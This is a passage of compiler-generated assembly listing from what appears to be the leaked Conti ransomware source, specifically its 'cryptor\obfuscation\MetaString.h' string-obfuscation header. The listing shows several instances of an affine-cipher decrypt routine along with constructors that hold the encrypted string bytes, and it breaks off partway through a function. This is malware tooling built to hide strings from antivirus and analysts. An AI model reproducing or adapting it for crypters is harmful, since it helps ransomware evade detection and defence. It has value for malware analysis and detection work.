?decrypt@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 0c	 sub	 ecx, 12

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 25	 mov	 BYTE PTR [rcx+1], 37	; 00000025H
  00007	c6 41 02 0c	 mov	 BYTE PTR [rcx+2], 12
  0000b	c6 41 03 49	 mov	 BYTE PTR [rcx+3], 73	; 00000049H
  0000f	c6 41 04 0c	 mov	 BYTE PTR [rcx+4], 12
  00013	c6 41 05 7e	 mov	 BYTE PTR [rcx+5], 126	; 0000007eH
  00017	c6 41 06 0c	 mov	 BYTE PTR [rcx+6], 12
  0001b	c6 41 07 0b	 mov	 BYTE PTR [rcx+7], 11
  0001f	c6 41 08 0c	 mov	 BYTE PTR [rcx+8], 12
  00023	c6 41 09 0c	 mov	 BYTE PTR [rcx+9], 12
  00027	c6 41 0a 0c	 mov	 BYTE PTR [rcx+10], 12
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 10 00 00
	00		 mov	 r11d, 16
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 1f	 sub	 ecx, 31

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 33	 mov	 BYTE PTR [rcx+1], 51	; 00000033H
  00007	c6 41 02 1f	 mov	 BYTE PTR [rcx+2], 31
  0000b	c6 41 03 1d	 mov	 BYTE PTR [rcx+3], 29
  0000f	c6 41 04 1f	 mov	 BYTE PTR [rcx+4], 31
  00013	c6 41 05 2e	 mov	 BYTE PTR [rcx+5], 46	; 0000002eH
  00017	c6 41 06 1f	 mov	 BYTE PTR [rcx+6], 31
  0001b	c6 41 07 3f	 mov	 BYTE PTR [rcx+7], 63	; 0000003fH
  0001f	c6 41 08 1f	 mov	 BYTE PTR [rcx+8], 31
  00023	c6 41 09 50	 mov	 BYTE PTR [rcx+9], 80	; 00000050H
  00027	c6 41 0a 1f	 mov	 BYTE PTR [rcx+10], 31
  0002b	c6 41 0b 50	 mov	 BYTE PTR [rcx+11], 80	; 00000050H
  0002f	c6 41 0c 1f	 mov	 BYTE PTR [rcx+12], 31
  00033	c6 41 0d 2e	 mov	 BYTE PTR [rcx+13], 46	; 0000002eH
  00037	c6 41 0e 1f	 mov	 BYTE PTR [rcx+14], 31
  0003b	c6 41 0f 1f	 mov	 BYTE PTR [rcx+15], 31
  0003f	c6 41 10 1f	 mov	 BYTE PTR [rcx+16], 31
  00043	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00047	48 8b c1	 mov	 rax, rcx
  0004a	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0BP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::MetaBuffer<17,31,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0e 00 00
	00		 mov	 r11d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 78	 sub	 ecx, 120		; 00000078H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 54	 mov	 BYTE PTR [rcx+1], 84	; 00000054H
  00007	c6 41 02 78	 mov	 BYTE PTR [rcx+2], 120	; 00000078H
  0000b	c6 41 03 04	 mov	 BYTE PTR [rcx+3], 4
  0000f	c6 41 04 78	 mov	 BYTE PTR [rcx+4], 120	; 00000078H
  00013	c6 41 05 70	 mov	 BYTE PTR [rcx+5], 112	; 00000070H
  00017	c6 41 06 78	 mov	 BYTE PTR [rcx+6], 120	; 00000078H
  0001b	c6 41 07 29	 mov	 BYTE PTR [rcx+7], 41	; 00000029H
  0001f	c6 41 08 78	 mov	 BYTE PTR [rcx+8], 120	; 00000078H
  00023	c6 41 09 7b	 mov	 BYTE PTR [rcx+9], 123	; 0000007bH
  00027	c6 41 0a 78	 mov	 BYTE PTR [rcx+10], 120	; 00000078H
  0002b	c6 41 0b 7b	 mov	 BYTE PTR [rcx+11], 123	; 0000007bH
  0002f	c6 41 0c 78	 mov	 BYTE PTR [rcx+12], 120	; 00000078H
  00033	c6 41 0d 78	 mov	 BYTE PTR [rcx+13], 120	; 00000078H
  00037	c6 41 0e 78	 mov	 BYTE PTR [rcx+14], 120	; 00000078H
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0EH@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<71,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 6f 00 00 00	 mov	 eax, 111		; 0000006fH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 4c	 mov	 BYTE PTR [rcx+1], 76	; 0000004cH
  00007	c6 41 02 6f	 mov	 BYTE PTR [rcx+2], 111	; 0000006fH
  0000b	c6 41 03 61	 mov	 BYTE PTR [rcx+3], 97	; 00000061H
  0000f	c6 41 04 6f	 mov	 BYTE PTR [rcx+4], 111	; 0000006fH
  00013	c6 41 05 49	 mov	 BYTE PTR [rcx+5], 73	; 00000049H
  00017	c6 41 06 6f	 mov	 BYTE PTR [rcx+6], 111	; 0000006fH
  0001b	c6 41 07 39	 mov	 BYTE PTR [rcx+7], 57	; 00000039H
  0001f	c6 41 08 6f	 mov	 BYTE PTR [rcx+8], 111	; 0000006fH
  00023	c6 41 09 6f	 mov	 BYTE PTR [rcx+9], 111	; 0000006fH
  00027	c6 41 0a 6f	 mov	 BYTE PTR [rcx+10], 111	; 0000006fH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 66		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 58 00 00 00	 mov	 eax, 88			; 00000058H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  00039	f7 e9		 imul	 ecx
  0003b	03 d1		 add	 edx, ecx
  0003d	c1 fa 06	 sar	 edx, 6
  00040	8b c2		 mov	 eax, edx
  00042	c1 e8 1f	 shr	 eax, 31
  00045	03 d0		 add	 edx, eax
  00047	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004a	2b c8		 sub	 ecx, eax
  0004c	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00051	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00054	f7 e9		 imul	 ecx
  00056	03 d1		 add	 edx, ecx
  00058	c1 fa 06	 sar	 edx, 6
  0005b	8b c2		 mov	 eax, edx
  0005d	c1 e8 1f	 shr	 eax, 31
  00060	03 d0		 add	 edx, eax
  00062	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00065	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

